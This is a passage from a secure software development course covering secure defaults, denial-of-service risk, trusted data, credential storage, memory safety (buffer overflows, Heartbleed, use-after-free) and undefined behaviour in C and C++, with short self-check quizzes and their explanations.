Get configuration information (especially if it can contain code) from a trustworthy source - not from an untrusted user. If you are building a traditional desktop application, it as fine to get the configuration from the home directory or a configuration directory inside it like **$HOME/.config**, but beware of configurations or any other data from the current directory; the user may have uncompressed data from an attacker into the current directory. Server-side web applications should only download configurations and code from trusted sources (e.g., their local directories). Client-side web applications should use Content Security Policy (CSP) to limit where they can get information, as we will further discuss later.

On startup, or even periodically, consider checking that your security assumptions are valid and halt if they are not. For example, if you have access to some private files, ensure that they are not group- or world-readable. If it’s a web application, check that **https** (TLS) is being used. Some checks are not worth doing (because they are too hard to do), but even a few sanity checks can detect and prevent some problems.

Sometimes users may need to disable some security measure. Where possible, make that an exceptional case; users should not normally need to do this. If they do, ensure that the users **_know_** that they are disabling something important and what the consequences are. At the least, document that it is dangerous and why. In such cases, it may be wise to report or at least log on startup what security measure was disabled, note that this is dangerous, and note how to re-enable it.

Most larger systems need some mechanism to receive configuration information. Make sure you can trust the source if it matters. For example, **setuid** programs receive environment variables from a potential adversary; such programs need to validate the environment variables they will allow, extract them, erase all environment variables, and then reset only the values to ones they can trust.

Some systems try to depend on *secure boot* or similar mechanisms to ensure that only specific software is run on a particular computer. Don’t take these mechanisms very seriously if the computer (such as a smartphone) may be physically controlled by a potential attacker. If an attacker has physical control over a device, then that attacker has ultimate control over the device. The reality is that secure boot systems have been repeatedly broken; trusting this to never happen in the future is ignoring the lessons of the past. You are better off designing your system so that you don’t need to trust the application on that device, but instead run software you need to trust on hardware controlled by someone you trust. Secure boot systems are far more powerful if the system is physically controlled by a trusted party, because then they are simply providing an additional protective measure for the one physically in control.

🔔 Security misconfiguration is such a common mistake in web applications that it is 2017 OWASP Top 10 #6 and 2021 OWASP Top 10 #5. 2021 CWE Top 25 #19 [CWE-276](https://cwe.mitre.org/data/definitions/276.html) covers *Incorrect Default Permissions*.

#### Quiz 1.10: Special Inputs: Secure Defaults and Secure Startup

\>\>For ease of use, you should deliver applications with a standard known password and make it clear in the documentation how to change that password. True or False?<<

( ) True

(x) False

[Explanation]

Absolutely not. If there is a standard known password, it will be immediately posted on the World Wide Web, and all attackers will use that password when trying to attack those systems. Many users will not read documentation. For an application to be secure, it needs to be “secure by default"; an application with a known preset password is *insecure* by default. One alternative would be to have a “please create your password” prompt when the application is first used.

[Explanation]

## Consider Availability on All Inputs

### Consider Availability on All Inputs Introduction

As we discussed before, it is often difficult to guarantee availability in all possible circumstances. For example, if a system is publicly accessible over the Internet, an attacker could initiate a large-scale distributed denial-of-service (DDoS) attack, overwhelming your service’s resources.

But once you start considering availability as a risk management problem, things are not so dire. You want to reduce the risk from DoS attacks, that is, reduce their likelihood or impact. You can reduce the likelihood by making the attack more difficult, risky, or resource-intensive for the attacker.

#### Try to Eliminate Easily Amplified Inputs

A useful concept is the idea of leverage. *“In the context of a DoS attack, if a vulnerability has high leverage it means attackers can consume a ton of your server resources with minimal resources… the higher the leverage, the higher the risk, and the more likely I am to address the issue directly. The lower the leverage, the more likely I’ll accept the risk and/or lean on [other] mitigations.”* ([*Not all attacks are equal: understanding and preventing DoS in web applications*](https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/), by Jacob Kaplan-Moss, 2020)

Consider each kind of input your software receives. Is there any way an attacker can send a very small amount of input and consume a large amount of resources (e.g., computation and/or output)? These are often higher risk to availability, because these inputs are easily amplified.

Here are some examples of resources an input might disproportionately consume:

* Network bandwidth — e.g., an input can produce a disproportionately large output.

* CPU utilization — e.g., an input can cause large amounts of computation; we have seen an example of that earlier in ReDoS.

* Storage space — e.g., a compressed file might expand to fill storage.

* Concurrency limits — e.g., an input can cause a thread/process to run slowly, causing the software to reach concurrency maximums (e.g., the number of threads, processes, or database connections).

The risks of these can be reduced via authentication, since then attackers have to expose some information about themselves. In general, try to eliminate at least the unauthenticated ones, and consider requiring some kind of authentication for the rest ([*Not all attacks are equal: understanding and preventing DoS in web applications*](https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/), by Jacob Kaplan-Moss, 2020).

One partial solution to reduce network bandwidth is *paging*. That is, instead of returning a very large result, return smaller results each time. This requires the attacker to repeatedly make requests.

If you cannot eliminate highly amplified inputs, try to distribute the load. For example, if you are distributing large files, consider using a Content Delivery Network (CDN), torrent, or other such system. Many websites use CDNs so that simple requests with potentially-large replies do not overwhelm their servers.

#### Rate Limiting

A simple widely-used approach on networked systems to improve availability is rate limiting. Rate limiting limits the rate of input requests (e.g., for a given user, API key, or IP address). As long as the rate limits are relatively high, rate limits don’t significantly impact normal use, and they can make single-system DoS attacks much less effective. In some cases, rate limits can even provide a partial countermeasure against DDoS attacks (since they may reduce the effectiveness of each attacking system). Rate limiting also counters some accidental problems.

Note that if you force attackers to make many requests (e.g., via paging), the attacker may start to hit rate limits.

Rate limiting is not a complete solution, but it is an easy and inexpensive approach that increases the costs and efforts for attackers.

# Processing Data Securely

This chapter describes how to process data within software with security in mind, including treating untrusted data as dangerous, avoiding default and hardcoded credentials, avoiding memory safety issues (such as buffer overflows), and avoiding undefined behavior.

Learning objectives:

1. Discuss how to process data securely (e.g., treat untrusted data as dangerous).

2. Understand the importance of avoiding default and hardcoded credentials.

3. Discuss memory safety and the problems when it is not present: out-of-bounds reads/writes, double-free, use-after-free.

4. Understand avoiding undefined behavior.

## Processing Data Securely: General Issues

### Prefer Trusted Data. Treat Untrusted Data as Dangerous

Of course, once your software gets data, it needs to process that data.

If it matters, make sure you process your data by using an environment you can trust. Just like input validation, if you care about the answer after data processing, you need to process your data on a system you can trust. If you process data using a script on a web browser or a mobile application and that web browser or mobile application might be controlled by an attacker, then you cannot trust anything that it does; all that data will be visible to the attacker and the attacker might force different results. If attackers can only attack themselves, that is not a problem, but make sure it is limited to that. If an untrusted system processes some data, and sends the result to you, you need to treat it as untrusted data.

Which leads us to a useful rule-of-thumb: *whenever given a choice, try to use the more trusted data.*

An example might help. Many systems, when sent a password reset request, send an email to confirm the password reset. At one time GitHub would ask an untrusted user for their email address. If that matched an email address in their database, ignoring upper/lower case distinctions using the rules of English, GitHub would send the password reset to the email address *as provided by the attacker*. This was a terrible idea. Email standards do not guarantee that the local part of the email address (the part before the **@** symbol) is case insensitive (see [IETF RFC 5321 section 2.3.11](https://tools.ietf.org/html/rfc5321#section-2.3.11)). By converting the email address to lower case, there is no guarantee that the reset would be sent to the correct email address. Many email systems do ignore upper/lower case distinctions, but they might not use English! In some Turkic email systems, the local part of the email address would normalize to a *different* distinct email account than the original account. For example, **MIKE@example.org** would normalize to **mıke@example.org** (using a dotless i), which would be a different email account from **mike@example.org** (which uses a dotted i). This led to an exploitable vulnerability (GitHub Security, [*Password reset emails delivered to the wrong address*](https://bounty.github.com/researchers/jagracey.html), 2016).

This attack seems subtle, but this is a clear violation of our basic rule of thumb: if you have more trusted data available, try to use *that* more trusted data! For example, if you have a password reset request, and you want to send an email to confirm that the originally-confirmed user authorized it, you should send the reset email to exactly the *already confirmed* email address in your database. You have already confirmed that is the correct email address, so you can place more trust in it. This simple rule - *try to use the more trusted data* -  will avoid many subtle attacks without you even realizing it.

However, many applications do have to process untrusted data. In that case, when you have to process untrusted data, treat it as **_radioactive_** - that is, be careful when you process it in any way, remembering that it might be from an attacker. There are many ways you need to be careful, as we will discuss.

#### Quiz 2.1: Prefer Trusted Data. Treat Untrusted Data as Dangerous

\>\>If we receive a password reset request for an email account, and it has a case-insensitive match to a verified email account in our database, we should send the confirmation to the email account the user just sent. True or False?<<

( ) True

(x) False

[Explanation]

Absolutely not. A potential attacker has sent an email address, and so the only thing you can be sure of is that someone sent that email address. If the reset is for a particular account, only an email to an address *known* to apply to that account (from the database) should be used, because in general we prefer to use (more) trusted data.

Password resets using just email are not a strong authentication mechanism to start with. But it is a common enough circumstance, and it is useful as a simple example.

[Explanation]

### Avoid Default & Hardcoded Credentials

Many programs have to use some secret information. An especially common kind of secret is a *credential* (e.g., a password or secret key).  How you protect them depends on how they are used, and there are two common uses for credentials:

* **Inbound**<br>The software receives some credentials as input and checks if it matches to authenticate something else.

* **Outbound**<br>The software sends the credentials to something else to authenticate itself to something else.

#### Avoid Default Credentials

Software should never be delivered with default credentials. There are endless web pages that track default credentials like **admin/admin**. Once anyone finds the credentials, they are likely to eventually end up on these listings. This will enable attackers to break into your software (if it is an inbound credential) or others’ software (if it is an outbound credential). If the software has many installations, then they may all be vulnerable at the same time. **Remember:** Users generally accept whatever is the default, and if the default is insecure, then the software will be insecure. Obfuscating the code is not enough; many attackers are quite adept at extracting and analyzing executables.

The usual solution for this is to have a “first login” mode that detects that there is no credential (password or key) yet, and then lets the user create a unique one. That is assuming it needs to be stored at all; in some cases, you can simply ask the user to provide it each time.

#### Avoid Hardcoded Credentials, Store Them Safely Instead

Hardcoded credentials are credentials stored within the source code, compiled code, or any other location that cannot be quickly changed by someone authorized to do so.

Hardcoded credentials are mistakes. Credentials should be changed whenever the software is first installed for use and should be easy and quick to change. Storing credentials in source code is a particularly bad idea. Source code is typically managed by version control systems, so any credentials in the code will become available to anyone with access to that source code … and that is often far more people than need to know. Encoding this information in a way that can be undone (e.g., using Base64 or ROT13) doesn’t help.

So: don’t hardcode credentials (e.g., within source code or compiled code). Instead, store credentials separately in a way that makes them easy to change. Public key certificates usually don’t need to be kept secret, but they may need to be updated. Other credentials often need to be kept secret, and should be protected at least as much as necessary. As we will briefly discuss later, there are tools that may help you identify hardcoded credentials in source code.

For inbound authentication using passwords, store credentials separately and use a secure algorithm specifically designed for encoding them. We will discuss this in more detail later in the section on Cryptography, but for now, just know that you need to use an *iterated per-user salted cryptographic hash* algorithm such as Argon2id.

For outbound authentication, credentials should be stored outside the code in a storage system that is protected from all outsiders (including local users on the same system/cloud host). Ideally, all credentials would be stored in an encrypted file or database, but in many environments, this is difficult to do (where do you store the key to access the key?). At the very least, store credentials in something like a file or database table with permissions that are as restrictive as you can practically make them. Environment variables are generally a weaker way to store credentials, since their values are available to the entire process that loads them, but in some circumstances this is acceptable… and it is generally much better than hardcoding credentials.

🔔 Hardcoded credentials are such a common cause of security vulnerabilities that they are 2021 CWE Top 25 #16 and 2019 CWE Top 25 #19. This weakness is [CWE-798](https://cwe.mitre.org/data/definitions/798.html), *Use of Hard-coded Credentials*. The related *Insufficiently Protected Credentials* is 2021 CWE Top 25 #21 and 2019 CWE Top 25 #27 as [CWE-522](https://cwe.mitre.org/data/definitions/522.html).

#### Quiz 2.2: Avoid Default & Hardcoded Credentials

\>\>Secret keys should be stored in source code so that they cannot be easily read, as they could be if they were stored in separate files. True or False?<<

( ) True

(x) False

[Explanation]

No, quite the opposite. Don’t store secret keys in source code! Source code is often shared with many others, and is stored in version control systems (making it more accessible to others). Another reason to store secret keys separately is so they can be easily changed. If an attacker reads the secret keys, then just change the keys.

[Explanation]

### Avoid Incorrect Conversion or Cast

Almost all programming languages support multiple data types, such as integers, floating point, characters, and strings. Most programming languages have at least some type checking built into them; types can be checked statically (before run-time) and/or dynamically (at run-time). These checks can sometimes warn, or counter, serious problems.

Sometimes it is necessary to convert or cast a data value from one type to another. The details depend on the programming language, but while it is necessary, incorrect conversions and casts end up causing a disproportionate number of vulnerabilities. The conversion can lose information, or lead to a new value that might have been completely unexpected. Any conversion or casting, especially one that might lose information, should be reviewed to consider if there is a risk to doing it. Some languages have a **const** qualifier for declaring constants; it is dangerous to cast away a **const** qualifier, because this allows changes to the value while other parts of the system may depend on it being constant.

A special case, which can happen in some programming languages, is called “type confusion”. Type confusion occurs when the access to a resource occurs using a type that’s incompatible with its original type. This could be considered a silent incorrect conversion. This is easily done in languages like C and C++ using union types, where the same memory region can be expressly defined as allowing multiple types. When using union types, the developer must ensure that only the correct type is used for a given access (read or write).

Type confusion isn’t limited to C and C++, however. Type confusion can happen in any language where the same variable or memory location can be interpreted in more than one way. As noted by MITRE for [CWE-843](https://cwe.mitre.org/data/definitions/843.html), “errors in PHP applications can be triggered by providing array parameters when scalars are expected, or vice versa. Languages such as Perl, which perform automatic conversion of a variable of one type when it is accessed as if it were another type, can also contain these issues.”

For our purposes, conversions do not include determining if a value is truthy. In general, programming languages have conditional constructs (such as **if** and **while**) that will produce different results depending on whether or not a condition’s value is truthy. What is truthy is a key design decision when creating a programming language. For example, every value in JavaScript is considered truthy except for a specific list of falsy values (currently **false**, **0**, **-0**, **0n**, **“”**, **null**, **undefined**, and **NaN**). In such languages, **if p** and similar are a shorthand for checking if a value is truthy. This interpretation in conditionals might be considered a conversion from some other type into a boolean type, but such constructs are really just an abbreviated way to determine if a value is truthy, and that is not what we are concerned with here.

🔔 *Incorrect Type Conversion or Cast* ([CWE-704](https://cwe.mitre.org/data/definitions/704.html)) is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #28. 2021 CWE Top 25 #36 refers to its special case, *Access of Resource Using Incompatible Type ('Type Confusion')* ([CWE-843](https://cwe.mitre.org/data/definitions/843.html)).


#### Quiz 2.3: Avoid Incorrect Conversion or Cast

\>\>Which of the following might be concerning about a cast? Select all answers that apply.<<

[!x] The cast might lose important information.

[x] The cast might produce a new value that was unexpected in that context.

[x] The cast might remove whether or not the value is considered constant, causing potential problems for other code that might depend on it being constant.

[ ] The cast might change the type.

[Explanation]

A cast changes a value’s type (that is what it is *for*), so by itself that is not concerning. What is concerning are the potential impacts of such changes in context.

[Explanation]

## Processing Data Securely: Undefined Behavior / Memory Safety

### Countering Out-of-Bounds Reads and Writes (Buffer Overflow)

[Memory-unsafe code]

#### Memory Safety

Unfortunately, handling untrusted data can be *especially* hard in some programming languages or when certain programming language modes are enabled. Most programming languages automatically prevent any attempt to read or write memory areas that are not allocated. These are called *memory safe languages*. However, memory safety mechanisms generally have a performance overhead.

As a result, some programming languages that emphasize performance are either *not* memory safe or have a way to disable memory safety. The widely-used programming languages C and C++ are *not* memory safe. There are also some languages emphasize performance that are *normally* memory safe, but have a way to disable safety checks to enable adequate performance; these include Rust (when using unsafe code), C# (when using unsafe code), and Ada (when using pragma suppress to suppress memory safety checks).

Memory safety problems are a common cause of vulnerabilities. Catalin Cimpanu’s study, [*Microsoft: 70 percent of all security bugs are memory safe issues*](https://www.zdnet.com/article/microsoft-70-percent-of-all-security-bugs-are-memory-safety-issues/) (2019), found that about ~70% of all Microsoft vulnerabilities in 2006-2018 were due to memory safety issues. What is more, while there are annual fluctuations, it has been relatively stable over that time:

![Memory safety has been consistently a vulnerability over time](memory_safety_over_time.png)

**Percentage of memory-safety vulnerabilities at Microsoft** (by Catalin Cimpanu, 2019, retrieved from [ZDNet](https://www.zdnet.com/article/microsoft-70-percent-of-all-security-bugs-are-memory-safety-issues/))

Memory safety is a subset of a larger category called *undefined behavior*, where the system guarantees nothing - and undefined behavior often leads to security vulnerabilities. We will discuss this more later, but we will briefly note that C and C++ have a remarkably large number of undefined behaviors, making it especially difficult to write secure software in these languages.

You can have these problems *even if* you write code in a language that is memory-safe and has no undefined behaviors. Your code might call some *other* code with undefined behavior that leads to vulnerabilities. Since almost every program ends up calling out to at least some code written with C or C++, that means at least some parts of your program might be indirectly vulnerable, even if your program is not written in C or C++.

One of the best-known attacker tricks is out-of-bounds reads and writes (including *buffer overflows*) - so we will briefly talk about what that is and how to counter it. We will then discuss another kind of flaw that often leads to security vulnerabilities, double-frees. Finally, we will discuss the larger category of undefined behaviors.

#### Out-of-Bounds Reads/Writes and Buffer Overflow

One of the most common kinds of security vulnerabilities is where a read or write is *“out of bounds”* inside memory-unsafe code. Such vulnerabilities are common, and attackers find them easy to exploit. This problem has been well-known for a long time; Aleph One (Elias Levy) describes in detail in [*Smashing the Stack for Fun and Profit*](http://phrack.org/issues/49/14.html#article) (1996) how to exploit such vulnerabilities.

🔔 Out-of-bounds reads and writes are so common and dangerous that in the 2021 CWE Top 25 list, the #1 weakness involves writes ([CWE-787](https://cwe.mitre.org/data/definitions/787.html) *Out-of-bounds Write*), the #3 weakness involves reads ([CWE-125](https://cwe.mitre.org/data/definitions/125.html) *Out-of-bounds Read*), and the general issue is #17 ([CWE-119](https://cwe.mitre.org/data/definitions/119.html) *Improper Restriction of Operations within the Bounds of a Memory Buffer*). In the 2019 CWE Top 25 list the general issue is #1 ([CWE-119](https://cwe.mitre.org/data/definitions/119.html) *Improper Restriction of Operations within the Bounds of a Memory Buffer*), and specific cases of it are #5 ([CWE-125](https://cwe.mitre.org/data/definitions/125.html) *Out-of-bounds Read*) and #12 ([CWE-787](https://cwe.mitre.org/data/definitions/787.html) *Out-of-bounds Write*).

Here are the fundamentals. Almost all programs have to store intermediate results, and such storage areas are often called *buffers*. Reading and writing within that buffer is fine. But what happens when your program tries to read from or write to that buffer, but it tries to do that outside the range of that storage area? For example, here is a trivial fragment of a C program that allocates some array **x** of size 10 (index values 0 through 9), and later stores the value of **y** to the index value **i** of that array:

~~~~C
    char x[10];
    ...
    x[i] = y;
~~~~

What happens if the value of **i** is out of bounds (that is, has a value other than 0 through 9)? There are two safe and common options that happen in different programming languages:

1. **Resize**<br>In many programming languages, trying to write (or read) out of bounds will resize the array so that the value can be stored or read from.

2. **Error**<br>In some languages, particularly those focused on excellent performance, an error (usually an exception) will be reported if the index is out of bounds.

Unfortunately, there is a third option: an out-of-bounds read or write can be accepted and turned into a potential security vulnerability. If you use a memory-unsafe language such as C, C++, or assembly language, then any read or write that can go out-of-bounds is a potentially dangerous security vulnerability. This problem can also happen if the language is normally memory-safe, but you disable the language’s memory safety checks (such as Rust, C#, and Ada).

In C, any attempt to read or write outside the bounds of a buffer (via an array index or a pointer) is an example of *undefined behavior*. If a C program will eventually execute a statement that will cause undefined behavior, the code is allowed to do anything at all at any time - even before that statement that caused the undefined behavior! You can find more information in the following references:

* [*With Undefined Behavior, Anything is Possible*](https://raphlinus.github.io/programming/rust/2018/08/17/undefined-behavior.html) (2018), by Raph Levien

* [*Undefined behavior can result in time travel (among other things, but time travel is the funkiest)*](https://devblogs.microsoft.com/oldnewthing/20140627-00/?p=633) (2014), by Raymond Chen

* [*A Guide to Undefined Behavior in C and C++ (Parts 1-3)*](http://blog.regehr.org/archives/213) (2010), by John Regehr.

In *practice*, if there is no memory safety, a write outside a buffer in most programming language implementations often ends up corrupting internal data structures that the program depends on. For example, it may overwrite local variables and/or change what will be run after a function returns. Similarly, a read outside a buffer often reveals internal information that is not normally revealed, including secrets that security (such as keys or hardening systems) depend on. In addition, if it is C or C++, compilers will often use such statements as a license to generate some very surprising machine code (because compiler authors are allowed to presume that such things will not happen). Attackers have honed their craft over decades to exploit these vulnerabilities, because they are common and they can often quickly turn discovery of this kind of vulnerability into a devastating attack.

There are many names for these attacks, with varying terminology and meanings. One of the most common variations of this vulnerability is when the attacker can write past the end of an array, and this vulnerability is sometimes called a *classic buffer overflow* vulnerability. An attack that exploits this vulnerability by writing data outside a buffer is often called a *stack smashing attack* (if the buffer is on the stack, such as by being a local parameter) or a *heap smashing attack* (if the buffer is on the heap, that is, was previously allocated by **new** or **malloc** depending on the language). CWE has various identifiers and names, including [CWE-119](https://cwe.mitre.org/data/definitions/119.html) (*Improper Restriction of Operations within the Bounds of a Memory Buffer*), which is a special case of [CWE-118](https://cwe.mitre.org/data/definitions/118.html) (*Incorrect Access of Indexable Resource (‘Range Error’)*).

If an attacker can cause your program to write outside its buffer, this often results in a serious vulnerability where the attacker can cause the program to do anything at all.

Unbounded writes are not the only problem. Historically, people worried about out-of-bounds writes more than reads, but the Heartbleed vulnerability in 2014 showed that out-of-bounds reads could also be extremely dangerous. Out-of-bounds reads can reveal information that allow attackers to completely break into a system. Even programs that only allow one byte of an out-of-bound read or write can have a dangerous vulnerability.

![image alt text](heartbleed.png)

**Heartbleed Explained**. Retrieved from [xkcd](https://xkcd.com/1354/), licensed under [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/)

> 😱 STORY TIME: Heartbleed

> In 2014 a vulnerability named Heartbleed ([CVE-2014-0160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-0160)) was found in the widely-used OpenSSL cryptographic library.  The key weakness was a buffer over-read (past the end of the buffer) was allowed in the heap due to improper input validation. This vulnerability allowed attackers to acquire sensitive data, and OpenSSL managed some extremely sensitive data such as server private keys. This vulnerability affected a huge number of popular websites, leading to problems such as user account hijacking and information compromises of millions of patients. ([*How to Prevent the next Heartbleed*](https://dwheeler.com/essays/heartbleed.html), 2020, by David A. Wheeler)

#### Solutions for Out-of-Bounds Reads and Writes

If you are curious, there are many papers and college courses that go into depth on exactly why this problem is so dangerous. But if you are just developing software, those details do not matter - you simply need to make sure that reads and writes are always within the bounds of what they are supposed to refer to. So how can we do this?

The simplest solution: **_always, where practical, use memory-safe languages and keep memory safety on_**. Almost all programming languages are memory-safe, at least by default. If you try to access a buffer outside of its bounds in a memory-safe language, it will resize the buffer or give you an error (typically an exception). In either case, the system doesn’t just cede control to an attacker. This solution is easier to apply when you are writing code from scratch, of course.

But sometimes this is not practical. This means you could never use C, C++, or assembly language. It would also mean you could not ever disable memory-safety in other languages. There are many large programs in C or C++ that would be difficult to rewrite, and of course, there are reasons people choose those languages. Most operating system kernels are written in C, since they are performance-critical and C was specifically designed for this task. Similarly, in languages that let you disable memory safety, there are reasons those mechanisms exist.

If you *must* have code without memory-safety, try to limit what is memory-unsafe where that is practical. For example, in languages that are memory-safe by default, but have mechanisms to disable it, you should minimize the amount of code that runs without memory safety. A large library in Rust, C#, or Ada should be almost entirely safe, with at most a very small unsafe portion. If you have a lot of existing C or C++ code, consider rewriting a portion in a memory-safe language. If you rewrite a portion, you should typically focus on the *most dangerous* portion (that is, code that is most exposed to attackers). For example, Mozilla’s Firefox browser was written mostly in C++ (and some JavaScript), but in 2017 some of that C++ code was replaced by implementations in Rust, and increasingly more and more of Firefox is written in Rust (Mozilla [*Oxidation*](https://wiki.mozilla.org/Oxidation) and [*Rust vs. C++ in macOS Firefox Nightly*](https://docs.google.com/spreadsheets/d/1flUGg6Ut4bjtyWdyH_9emD9EAN01ljTAVft2S4Dq620/edit#gid=885787479)).

If you have to program without memory safety checks, for whatever reason, then you have to carefully implement all the checks in the code itself. For security, you must make sure you never ever make a mistake: you must ensure that every reference is in bounds no matter what the attacker does. Each check is not hard to do; this is not rocket science. The problem is that never ever making a mistake is difficult to do. You can be very smart and still make a mistake. If you do write software without memory safety checks, where possible, you should use mechanisms like tools and peer review to reduce the risks of something slipping through to users. Later on we will discuss some of the tooling available to help.

Of course, just doing a check is not enough - what do you do when the check fails? The safest thing to do is to reject the input and not perform any action if a check fails along the way. However, it is often hard to do the rejection, and so developers are tempted to simply trim off any extra (or write code that accidentally does this). Sometimes that is fine, but this often means that an attacker can control what stays in the buffer and what doesn’t. That can sometimes lead to vulnerabilities, and determining if there is a vulnerability can be really difficult.

If you use C, there are many patterns that are especially likely to be vulnerable, including the use of functions like **strcpy()** to copy a string, **strcat()** to concatenate a string, and loops that incrementally add to a buffer. Early in C’s development, functions were created that limited where data would be written, specifically **strncpy()** and **strncat()**. However, using **strncpy()** and **strncat()** requires constant recalculation of the *space left over*, making them difficult to use correctly (it is extremely easy to have an “off by one” error in this code that only attackers notice). The **strncpy()** function also overwrites all remaining space, making it absurdly inefficient for most circumstances.

If you use C, sometimes you can use safer functions instead. The C function **snprintf()** writes output to a string buffer given a format, and it will not overwrite past a given length. The function **memccpy()** lets you do a simple copy, again without going beyond a maximum length. However, in all these cases you cannot just call the function - in most cases, you also have to check its return value to see if there was an overrun, and if there was, do something sensible (which is usually to stop processing the input). The functions **asprintf()** and **vasprintf()** let you reallocate a new string, which you can use to resize a string. As always, you must ensure that you free any previously-allocated strings once they are no longer used, and ensure that you only free them once (a problem we will discuss more soon). If you are not prepared to do this very carefully and methodically, you probably should not be using C.

Modern compilers for these languages, and the operating systems that support them, use a variety of hardening techniques to make exploiting these attacks harder. Widely-applied hardening measures include:

* Address Space Layout Randomization (ASLR)<br>Randomize where objects are stored in memory, making it harder for attackers to target some objects (in the gcc and clang compilers you may need to enable PIE mode, e.g., using **-fPIE**)

* Non-executable memory<br>Ensure that memory with executable instructions cannot also be written to at the same time, making it slightly harder for attackers to modify software or introduce their own malicious code.

* Canaries<br>Insert an extra check in selected functions; before they return, they do a sanity check on a value called a “guard” or “canary” that detects certain kinds of buffer overflows that perform writes (the gcc and clang compilers can do this with options like **-fstack-protector**)

* Automated bounds insertions<br>Modify code during compilation to do bounds checking even if was not originally requested (the gcc and clang compilers can do this with the option **-D_FORTIFY_SOURCE=2**).

If you are writing code that is not memory-safe, or calling code that is not memory-safe, make sure hardening measures like these are enabled whenever you can, including in compilation, test, and production. The good news is that hardening measures like these will slow down some exploits. But in the end, hardening measures often do not *prevent* exploits. In the best case, these hardening measures turn “take over program” into “program stops working”... and that is the *best* case. The only way to not have vulnerable code… is to not have vulnerable code.

#### Quiz 2.4: Countering Out-of-Bounds Reads and Writes (Buffer Overflow)

\>\>Programs written in memory-unsafe languages, such as C and C++, must be careful to *never* allow an untrusted user to cause an out-of-bounds read or write. This can be challenging to do without fail; correct application of functions like **snprintf()** can help. True or False?<<

(x) True

( ) False

[Explanation]

Correct. Of course, it is safer to not use memory-unsafe languages in the first place, but that is not always an option today.

[Explanation]

### Double-free, Use-after-free, and Missing Release

[Memory-unsafe code]

Out-of-bounds reads and writes are not the only problem for programs written in languages like C or C++.

When processing information you typically need to allocate memory (e.g., with **new**) and use it for a while. Most programming languages automatically track when you don’t need to use memory any more and reclaim it; this process is called *automatic garbage collection* or *automated memory management* (we will use the latter term). There are different ways to do automated memory management (the most typical are reference counting or tracing), and terminology varies, but the point is that in most programming languages this is automatically handled for you.

But in some programming languages you must *manually* release memory when you are done with it. In particular, this is true for C (**free**) and C++ (**delete**). If you forget to release the memory when you are done using it, this leads to a “memory leak"; the program will increasingly use more and more memory. In some situations this increasing memory use can lead to increasingly poor performance or a crash, which is a loss of availability.

Often the more important security issue is manually freeing the memory region *more* than once; this is called a *double free*. Another big security problem is *use-after-free*, that is, using the memory after it has been freed. In memory-safe languages a double-free or use-after-free won’t happen. However, a double-free or use-after-free in a C or C++ program often corrupts low-level infrastructure and can change the value of program values that *appear* to be unrelated.

If an attacker can cause your program to double-free or use-after-free, this can result in a serious vulnerability where the attacker can cause the program to do anything. That is because these mistakes often allow an attacker to corrupt and control the infrastructure your program runs on.

The obvious solution is to only use programming languages where you don’t have to manually release memory. Most programming languages handle memory management automatically.

In cases where that is not practical, simplify your code as best you can so that it is clear where deallocation will occur, so that it will occur exactly once and you never use it again. Consider setting pointers to NULL (0) when you are done with what they point to. This will reduce the risk of freeing them or using them again later, and if unnecessary many of those assignments will be optimized away by the compiler.

🔔 Use-after-free is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #7 and 2019 CWE Top 25 #7. It is [CWE-416](https://cwe.mitre.org/data/definitions/416.html) (*Use After Free*). Double-free is such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #31. It is [CWE-415](https://cwe.mitre.org/data/definitions/415.html) (*Double Free*).  Failing to release memory once it is no longer needed is 2021 CWE Top 25 #32; it is [CWE-401](https://cwe.mitre.org/data/definitions/401.html) (Missing Release of Memory after Effective Lifetime).

#### Quiz 2.5: Double-free, Use-after-free, and Missing Release

\>\>In C and C++ it doesn’t matter if you use a memory region after freeing it, as long as you use the memory region within the same function or method. True or False?<<

( ) True

(x) False

[Explanation]

No, it is not safe to use a memory region after freeing it, no matter what. It *might* work out a specific time, and not another.

[Explanation]

### Avoid Undefined Behavior

[Memory-unsafe code]

Many programming languages are defined in some sort of formal specification. When that is the case, where practical, you should try to write code that conforms to those specifications, because your code is more likely to work in all cases, and as the language implementations change, your code is more likely to keep working.

Sometimes these specifications will permit one of several different options (this is sometimes called “unspecified behavior” or “compiler-specific behavior”). You should normally try to write your code so that it does not matter which permitted option is used, it will just keep working. Languages that support threading allow the threads to execute in parallel and in arbitrary order. In many languages, the order of operations in a call such as **f(aa, bb, cc)** is not defined (that is, it does not guarantee that **aa** or **cc** is computed first). Beware of depending on what your tools currently do, because when the tools are upgraded what they do may change. For many developers, dealing with this is already second nature.

However, some languages (such as C and C++) have constructs with truly *undefined behavior*. That is, if you take certain actions, the specification guarantees *absolutely nothing*. For example, the [C FAQ](http://c-faq.com/ansi/undef.html) notes that with undefined behavior, *“Anything at all can happen; the Standard imposes no requirements. The program may fail to compile, or it may execute incorrectly (either crashing or silently generating incorrect results), or it may fortuitously do exactly what the programmer intended.”*

Any undefined behavior can be - and often is - a security vulnerability. Even if it just happens to not be a security vulnerability today, a minor upgrade in your tools, operating system, or configuration might turn it into a vulnerability.

Many languages have at least some undefined behaviors, and so, if you use those languages, you need to learn what they are and avoid them. C and C++ have an especially large number of undefined behaviors. For example, for C, there are hundreds of undefined behaviors; the list is 11 pages long in the publicly available final draft of [C18 annex J.2](https://web.archive.org/web/20181230041359if_/http://www.open-std.org/jtc1/sc22/wg14/www/abq/c17_updated_proposed_fdis.pdf). It is also very easy in C and C++ to accidentally write code that has undefined behavior.  We have already seen some examples of undefined behavior: reads and writes out of the bounds of a buffer, use-after-free, and double-frees. Here are a few more.

In C and C++, a null pointer dereference is also undefined (e.g., evaluating “**&#42;p**” when **p** is **NULL**). This means that an attempt to dereference a null pointer does not necessarily lead to trying to read an invalid value, the program might do *anything* at all.

🔔 *Null Pointer Dereference* ([CWE-476](https://cwe.mitre.org/data/definitions/476.html)) is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #15 and 2019 CWE Top 25 #14.

In C  and C++, signed integer overflow is undefined (e.g., an **int** with value **MAX_INT** with 1 added to it). There is no guarantee that signed integers wrap; instead, the program might do anything at all.

